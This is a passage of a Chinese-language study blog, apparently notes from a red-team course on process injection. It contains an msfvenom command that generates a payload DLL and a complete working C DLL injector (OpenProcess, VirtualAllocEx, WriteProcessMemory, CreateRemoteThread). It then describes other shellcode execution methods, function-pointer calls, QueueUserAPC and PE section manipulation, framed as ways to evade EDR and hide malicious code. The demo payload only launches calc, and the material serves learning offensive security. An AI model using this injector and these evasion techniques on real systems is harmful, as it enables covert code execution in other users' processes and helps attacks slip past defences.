<img src="/thm_rthe/image-20250822080345228.png" class="" title="image-20250822080345228">
<img src="/thm_rthe/image-20250822080402484.png" class="" title="image-20250822080402484">
<p>所以这里要写一个函数，把 ANSI 字符串转换为 <code>wchar_t</code> 类型。</p>
<p>好，这里解决了，下面有一个 <code>GetFullPathName</code> 方法，这个函数呢，有两种版本。但默认情况下，Visual Studio 项目是配置为 <strong>Unicode</strong> 的。这意味着 <code>GetFullPathName</code> 实际上调用的是 <code>GetFullPathNameW</code>。这下就导致 <code>dllLibFullPath</code> 接收到的是一个 <code>wchar_t</code> 类型，而系统又是把他当成 <code>char</code> 来对待。我 debug 的时候就发现他输出一个字符就不输出了。不过这里用 <code>GetFullPathNameA</code> 就解决了。</p>
<p>后面导入 <code>LoadLibrary</code> 方法的时候，要用 <code>GetModuleHandleA</code> ，至此解决了所有问题，可以注入 DLL 了。</p>
<p>解决这个的过程要善用调试工具，折腾这一下把 VS Studio 调试熟悉了。</p>
<p>如果你想通过调试查看 DLL 是否加载进程序了，通过 VS Studio 这个 Debug 是不够的，因为我们是注入到目标程序里面了，所以那一块的内存区域要用其他方式去读取。</p>
<p>用到的 DLL 是 msfvenom 生成的，你可以用以下代码生成 DLL。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/exec</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd=&quot;calc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dll</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">calc.dll</span></span></code></pre></div></div></figure>
<p>以下是我修改好的 dll-injector：</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;tlhelp32.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;string.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;wchar.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 将 ANSI 字符串转换为宽字符</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这是一个简单的辅助函数</span></span>
<span class="line"><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">AnsiToWideChar</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">const</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">ansiStr</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> len </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">MultiByteToWideChar</span><span style="color: #ABB2BF">(CP_ACP, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, ansiStr, </span><span style="color: #C678DD">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> wideStr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF">malloc</span><span style="color: #ABB2BF">(len </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">wchar_t</span><span style="color: #ABB2BF">));</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MultiByteToWideChar</span><span style="color: #ABB2BF">(CP_ACP, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, ansiStr, </span><span style="color: #C678DD">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, wideStr, len);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> wideStr;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">DWORD </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">const</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">processName</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE hSnapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(TH32CS_SNAPPROCESS, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hSnapshot) {</span></span>
<span class="line"><span style="color: #ABB2BF">        PROCESSENTRY32 entry;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwSize</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(PROCESSENTRY32);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32First</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">entry)) {</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">do</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #56B6C2">wchar_t</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF"> wideProcessName </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">AnsiToWideChar</span><span style="color: #ABB2BF">(processName);</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">//printf(&quot;%s\n&quot;, processName);</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">//wprintf(L&quot;%s\n&quot;, entry.szExeFile);</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">strcmp</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">szExeFile</span><span style="color: #ABB2BF">, wideProcessName)) {</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Found!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ProcessID</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">                }</span></span>
<span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32Next</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">entry));</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (argc </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Cannot find require parameters</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Usage: dll-injector.exe &lt;process name&gt; &lt;path to DLL&gt;</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">dllLibFullPath</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">256</span><span style="color: #ABB2BF">];</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    LPCSTR processName </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">];</span></span>
<span class="line"><span style="color: #ABB2BF">    LPCSTR dllLibName </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">];</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    DWORD processId </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(processName);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;processId: </span><span style="color: #D19A66">%d</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">)processId);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">processId) {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ProcessId Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">GetFullPathNameA</span><span style="color: #ABB2BF">(dllLibName, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(dllLibFullPath), dllLibFullPath, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)) {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;GetFullPathName Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE hProcess </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, processId);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hProcess </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hProcess Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    LPVOID dllAllocatedMemory </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath), MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (dllAllocatedMemory </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;dllAllocatedMemory Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(hProcess, dllAllocatedMemory, dllLibFullPath, </span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath) </span><span style="color: #C678DD">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)) {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;WriteProcessMemory Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    LPVOID loadLibrary </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (LPVOID)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">GetModuleHandleA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #98C379">&quot;LoadLibraryA&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE remoteThreadHandler </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)loadLibrary, dllAllocatedMemory, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (remoteThreadHandler </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;remoteThreadHandler Failed</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        DWORD error_code </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;CreateRemoteThread failed. Error Code: </span><span style="color: #D19A66">%lu</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, error_code);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(hProcess);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h2 id="Memory-Execution-Alternatives-内存执行替代">Memory Execution Alternatives 内存执行替代</h2>
<p>根据处于环境的不同，可能需要更改执行 shellcode 的方式。这通常发生在有些 API 被 Hook 了，但是没法绕过他，或者 EDR 在监视线程。</p>
<p>目前为止，我们已经研究了在本地/远程进程之间分配和写入数据的方法，执行也是任何注入技术中的关键一步；尽管在尝试最小化内存痕迹和 IOC 时，它并不那么重要。与分配和写入数据不同，执行有许多选项可供选择。前面几个任务我们通过 <code>CreateThread</code> 和 <code>CreateRemoteThread</code> 方法执行 shellcode 过，这里介绍另外三种执行方法。</p>
<h3 id="Invoking-Function-Pointers-调用函数指针">Invoking Function Pointers 调用函数指针</h3>
<p>这种方法的核心在于利用 C 语言的特性，将一个<strong>内存地址</strong>强制转换为函数指针，并直接调用。它<strong>不依赖额外的 API 调用来执行</strong>，但代码所在的内存区域<strong>必须是可执行的</strong>。虽然最常用于本地分配的内存，但在远程进程中，如果能获取到正确的地址并修改该进程的寄存器，理论上也可以利用。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">((</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)())addressPointer)();</span></span></code></pre></div></div></figure>
<ol>
<li><code>(void(*)())</code>。这是一个类型转换。它将后面的 <code>addressPointer</code> 强制转换成一个<strong>函数指针类型</strong>。
<ol>
<li><code>*</code>: 表示这是一个指针。</li>
<li><code>()</code>: 括号中的内容描述了该指针指向的函数的类型。</li>
<li><code>void</code>: 括号前面的 <code>void</code> 表示该函数没有返回值。</li>
<li><code>()</code>: 括号里面的 <code>()</code> 表示该函数没有参数。</li>
</ol>
</li>
<li><code>addressPointer</code> 是一个变量，它包含了你想要执行的代码的<strong>内存地址</strong>。通常，这个地址是在内存中动态分配或加载的。</li>
<li><code>()</code> 是<strong>函数调用操作符</strong></li>
</ol>
<p>整个过程就是将一个内存地址（<code>addressPointer</code>）强制视为一个没有参数和返回值的函数，然后立即调用它。</p>
<p>这种技术的使用场景非常特殊，但在需要时会非常隐蔽和有用。</p>
<h3 id="Asynchronous-Procedure-Calls-异步过程调用">Asynchronous Procedure Calls 异步过程调用</h3>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Asynchronous Procedure Calls</a></li>
</ul>
<p>Asyncrhonous Procedure Calls (APC) 是一种在指定线程中异步执行函数的机制。</p>
<p>简单来说，APC 就像是把你的恶意代码加入一个队列。当目标线程进入一个**可警报状态（alertable state）**时，它就会从队列中取出并执行你的代码，从而劫持线程的执行流。</p>
<p>APC 函数通过 <code>QueueUserAPC</code> 排队到线程。一旦排队成功，APC 函数就会导致一个软件中断，并在线程下一次被调度时执行该函数。为了让用户模式应用程序将 APC 函数排入队列，目标线程必须处于“可警报状态”。</p>
<p>可警报状态通常指的是线程正在执行一个等待函数，比如 <code>WaitForSingleObject</code> 或 <code>Sleep</code>。</p>
<p>这里我们假设已经把我们的 Shellcode 写入到内存了，<code>addressPointer</code> 是我们写入好的内存地址，<code>pinfo</code> 是获取到的 <code>PROCESS_INFORMATION</code> 结构体。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">QueueUserAPC</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">PAPCFUNC</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75; font-style: italic">addressPointer</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // APC 函数指针，指向我们已注入的 Shellcode 地址</span></span>
<span class="line"><span style="color: #E06C75">	pinfo.hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic">            // 目标线程的句柄，从 PROCESS_INFORMATION 结构体获取</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">ULONG_PTR</span><span style="color: #ABB2BF">)</span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic">           // 传递给 APC 函数的参数，这里为空</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 恢复线程执行</span></span>
<span class="line"><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #E06C75">	pinfo.hThread</span><span style="color: #7F848E; font-style: italic"> // 目标线程的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 等待线程执行完毕</span></span>
<span class="line"><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #E06C75">	pinfo.hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 目标线程的句柄</span></span>
<span class="line"><span style="color: #E06C75">	INFINITE</span><span style="color: #7F848E; font-style: italic">       // 无限等待，直到线程结束或被唤醒</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<h3 id="Section-Manipulation-节区操作">Section Manipulation 节区操作</h3>
<p>这个技术的核心是直接修改 <strong>PE (Portable Executable)</strong> 文件的内部结构，而不是简单地对代码进行加密或混淆。PE 文件是 Windows 可执行文件的基本格式，由不同的<strong>节区 (Sections)</strong> 组成，比如存放代码的 <code>.text</code> 节和存放数据的 <code>.data</code> 节。</p>
<ol>
<li>
<p><strong>PE 文件转储 (PE Dump)</strong>：首先，攻击者需要用工具（如 <code>xxd</code>）将恶意文件（如 DLL 或 Shellcode）的原始二进制数据提取出来。</p>
</li>
<li>
<p><strong>数学运算</strong>：然后，利用复杂的数学运算，计算出代码和数据在 PE 文件中的<strong>相对虚拟地址 (RVA)</strong>，这是 PE 文件中用来定位内容的相对偏移量。</p>
</li>
<li>
<p><strong>高级技术</strong>：利用这些 RVA，攻击者可以采用更精妙的手段来隐藏恶意代码：</p>
<ul>
<li>
<p><strong>RVA 入口点解析</strong>：修改 PE 文件头的入口点，将其指向恶意代码，从而让系统在加载文件时直接执行注入的代码。</p>
</li>
<li>
<p><strong>节区映射</strong>：在 PE 文件中创建新的节区，或修改现有节区的权限，以容纳恶意代码。</p>
</li>
<li>
<p><strong>重定位表解析</strong>：修改重定位表，确保注入的代码在程序加载到内存中的任意地址时都能正常运行。</p>
</li>
</ul>
</li>
</ol>
<p><strong>与常见混淆技术的区别</strong></p>
<p>与常见的 <strong>XOR 或 Base64 加密</strong>等混淆技术相比，节区操作是一种更底层、更高级的防御规避手段。</p>
<ul>
